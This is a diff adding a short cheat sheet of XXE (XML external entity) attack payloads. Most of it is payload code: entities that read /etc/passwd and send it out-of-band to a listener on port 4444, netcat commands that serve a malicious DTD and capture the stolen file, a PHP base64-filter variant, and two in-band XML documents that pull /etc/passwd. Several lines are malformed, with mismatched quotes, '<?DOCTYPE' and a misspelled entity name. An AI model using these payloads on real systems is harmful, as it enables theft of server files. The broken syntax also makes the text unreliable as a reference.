@@ -1,0 +1,30 @@
+XXE Payloads
+
+External DTD file
+<!ENTITY % dtd SYSTEM "http://127.0.0.1/payload.dtd"> %dtd;
+nc -lvp 80 < payload.dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM http://127.0.0.1:4444/collect-%file;'>">
+%all;
+nc -lp 4444 > passwd
+PHP PAYLOAD ON ERROR
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % all "<!ENTITY sebd SYSTEM http://127.0.0.1:4444/collect=%file;'>">
+%all;
+
+
+EXAMPLE GENERIC MALICIOUS XML
+<?xml version="1.0" encoding="utf-8"?>
+<?DOCTYPE harmless[
+	<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xxe>&xxe;</xxe>
+
+
+EXAMPLE TYPE-EMBEDDED MALICIOUS XML
+<?xml version="1.0" encoding="utf-8"?>
+<?DOCTYPE title[
+	<!ELEMENT something ANY>
+	<!ENTITY thisthing SYSTEM "file:///etc/passwd">
+]>
+<something>passwd: %thisthing;</something>
